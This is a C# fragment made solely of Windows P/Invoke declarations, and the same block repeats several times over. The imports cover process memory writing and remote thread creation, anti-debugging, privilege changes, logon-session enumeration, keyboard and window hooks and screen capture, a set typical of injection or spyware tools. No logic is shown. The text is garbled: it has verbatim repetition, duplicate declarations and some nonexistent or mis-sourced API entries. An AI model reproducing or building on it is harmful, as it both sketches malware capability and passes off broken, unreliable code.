        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
